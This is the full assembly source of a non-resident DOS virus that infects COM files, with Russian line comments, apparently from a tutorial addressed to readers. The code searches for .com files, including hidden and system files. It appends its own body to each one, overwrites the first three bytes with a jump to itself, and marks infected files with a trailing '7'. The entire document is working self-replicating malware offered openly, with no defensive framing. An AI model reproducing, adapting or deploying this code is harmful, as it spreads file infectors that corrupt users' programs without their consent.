    ; ________________________________________________
    ;|                                                |
    ;| Non - TSR COM virus                            |
    ;| Especially for my readers !                    |
    ;|________________________________________________|

    prg segment
       assume cs:prg,ds:prg,es:prg,ss:prg
          org 100h

    start:     jmp vir                ;Передача управ-
                                      ;ления вирусному
                                      ;коду ...
               org 110h

    vir:       push ds                ;Сохраним DS ...
                                      ;Корректируем
               mov ax,ds              ;регистр DS  ...
               db 05h                 ;Код команды
    add_to_ds: dw 0                   ; " ADD AX,00h "
               mov ds,ax              ;AX -> DS    ...

    fresh_bytes:
               mov al,old_bytes
               mov cs:[100h],al
               mov al,old_bytes+1
               mov cs:[101h],al
               mov al,old_bytes+2
               mov cs:[102h],al

               mov cx,80h             ;Размер DTA -
                                      ;128 байт ...
               mov bx,80h             ;Смещение к DTA
               lea si,old_dta         ;Адрес массива
    save_dta:
               mov al,byte ptr cs:[bx];Читаем из DTA
                                      ;байт и  перено-
               mov ds:[si],al         ;сим его в мас-
                                      ;сив ...
               inc bx                 ;К новому байту
               inc si                 ;
               loop save_dta          ;Цикл 128 раз

    find_first:
               mov ah,4eh             ;Поиск первого
                                      ;файла ...
               mov cx,00100110b       ;archive, system
                                      ;hidden
               lea dx,maska           ;Маска для поис-
                                      ;ка
               int 21h
               jnc r_3                ;Нашли !
               jmp restore_dta        ;Ошибка !

    find_next: mov ah,3eh             ;Закроем  непод-
               int 21h                ;ходящий файл...
               jnc r_2
               jmp restore_dta        ;Файл нельзя за-
                                      ;крыть !

    r_2:       mov ah,4fh             ;И найдем сле-
               int 21h                ;дующий ...
               jnc r_3                ;Файл найден !
               jmp restore_dta        ;Ошибка !

    r_3:       mov cx,12              ;Сотрем в буфере
               lea si,fn              ;"fn" имя  пред-
    destroy_name:                     ;ыдущего файла
               mov byte ptr [si],0    ;
               inc si                 ;
               loop destroy_name      ;Цикл 12 раз ...

               xor si,si              ;И запишем в бу-
    copy_name: mov al,byte ptr cs:[si+9eh]
                                      ;фер имя только
               cmp al,0               ;что найденного
                                      ;файла ...
               je open                ;В конце имени в
               mov byte ptr ds:fn[si],al
                                      ;DTA всегда сто-
               inc si                 ;ит ноль, его мы
               jmp copy_name          ;и хотим достичь

    open:      mov ax,3d02h           ;Открыть файл
                                      ;для чтения и
                                      ;записи ...
               lea dx,fn              ;Имя файла ...
               int 21h                ;Функция DOS
               jnc save_bytes
               jmp restore_dta        ;Файл не откры-
                                      ;вается !

    save_bytes:                       ;Считаем три
                                      ;байта :
               mov bx,ax              ;Сохраним дес-
                                      ;криптор в BX
               mov ah,3fh             ;Номер функции
               mov cx,3               ;Сколько байт ?
               lea dx,old_bytes       ;Буфер для счи-
                                      ;тываемых данных
               int 21h
               jnc found_size
               jmp close              ;Ошибка !

    found_size:
               mov ax,cs:[09ah]       ;Найдем размер
                                      ;файла
    count_size:mov si,ax
               cmp ax,64000           ;Файл длиннее
                                      ;64000 байт ?
               jna toto               ;Нет ...
               jmp find_next          ;Да - тогда он
                                      ;нам не подходит
    toto:      test ax,000fh          ;Округлим размер
               jz krat_16             ;до целого числа
               or ax,000fh            ;параграфов    в
               inc ax                 ;большую сторону
    krat_16:   mov di,ax              ;И  запишем  ок-
                                      ;ругленное  зна-
                                      ;чение в DI ...
                                      ;Расчитаем  сме-
                                      ;щение для пере-
                                      ;хода на код ви-
                                      ;руса ...
               sub ax,3               ;Сама    команда
                                      ;перехода  зани-
                                      ;мает три байта!
               mov byte ptr new_bytes[1],al
                                      ;Смещение найде-
               mov byte ptr new_bytes[2],ah
                                      ;но !
               mov ax,di              ;Сколько   пара-
               mov cl,4               ;графов содержит
               shr ax,cl              ;заражаемая про-
                                      ;грамма ?
               dec ax                 ;Учитываем дейс-
                                      ;твие директивы
                                      ;ORG 110h ...
               mov byte ptr add_to_ds,al
                                      ;Корректирующее
               mov byte ptr add_to_ds+1,ah
                                      ;число найдено !

               mov ax,4200h           ;Установим ука-
               xor cx,cx              ;затель на пос-
               dec si                 ;ледний байт
               mov dx,si              ;файла ...
               int 21h
               jnc read_last
               jmp close              ;Ошибка !

    read_last:                        ;И считаем этот
               mov ah,3fh             ;байт в ячейку
               mov cx,1               ; " last " ...
               lea dx,last
               int 21h
               jc close               ;Ошибка !

               cmp last,'7'           ;" last " =" 7 "
               jne write_vir          ;Нет - дальше
               jmp find_next          ;Да- поищем дру-
                                      ;гой файл ...

    write_vir: mov ax,4200h           ;Установим  ука-
               xor cx,cx              ;затель на конец
               mov dx,di              ;файла ...
               int 21h
               jc close               ;При ошибке -
                                      ;закроем файл
               mov ah,40h             ;Запишем  в файл
               mov cx,vir_len         ;код вируса дли-
               lea dx,vir             ;ной vir_len
               int 21h
               jc close               ;При ошибке -
                                      ;закроем файл
    write_bytes:
               mov ax,4200h           ;Установим  ука-
               xor cx,cx              ;затель на нача-
               xor dx,dx              ;ло файла
               int 21h
               jc close               ;При ошибке -
                                      ;закроем файл

               mov ah,40h             ;Запишем в  файл
               mov cx,3               ;первые три бай-
               lea dx,new_bytes       ;та ( команду
               int 21h                ;перехода ) ...

    close:     mov ah,3eh             ;Закроем   зара-
               int 21h                ;женный файл ...

    restore_dta:
               mov cx,80h             ;Размер DTA -
                                      ;128 байт ...
               mov bx,80h             ;Смещение к DTA
               lea si,old_dta         ;Адрес массива
    dta_fresh:
               mov al,ds:[si]         ;Читаем из  мас-
                                      ;сива "old_dta"
               mov byte ptr cs:[bx],al;байт и  перено-
                                      ;сим его в DTA
               inc bx                 ;К новому байту
               inc si                 ;
               loop dta_fresh         ;Цикл 128 раз

               pop ds                 ;Восстановим
                                      ;испорченный DS
               push cs                ;Занесем в стек
                                      ;регистр CS
               db 0b8h                ;Код команды
    jump:      dw 100h                ;mov ax,100h
               push ax                ;Занесем в стек
                                      ;число 100h
               retf                   ;Передача управ-
                                      ;ления на задан-
                                      ;ный адрес ...

    ;\*Data area ...

    old_bytes db   0e9h               ;Исходные три
                                      ;байта  заражен-
              dw   vir_len + 0dh      ;ной программы

    old_dta   db   128 dup (0)        ;Здесь вирус
                                      ;хранит исходную
                                      ;DTA программы
    maska     db   '*.com',0          ;Маска для поис-
                                      ;ка файлов ...
    fn        db   12 dup (' '),0     ;Сюда помещается
                                      ;имя файла -жер-
                                      ;твы ...
    new_bytes db   0e9h               ;Первые три бай-
              db   00h                ;та вируса в
              db   00h                ;файле ...

    last      db   0                  ;Ячейка для пос-
                                      ;леднего байта
              db   '7'                ;Последний байт
                                      ;вируса в файле

    vir_len   equ   $-vir             ;Длина вирусного
                                      ;кода ...

    prg_end:   mov ah,4ch             ;Завершение  за-
               INT 21H                ;пускающей прог-
                                      ;раммы ...

              db '7'                  ;Без этого  сим-
                                      ;вола вирус  за-
                                      ;разил бы сам
                                      ;себя ...

    prg ends                          ;Все ASM - прог-
    end start                         ;раммы  заканчи-
                                      ;ваются примерно
                                      ;так .
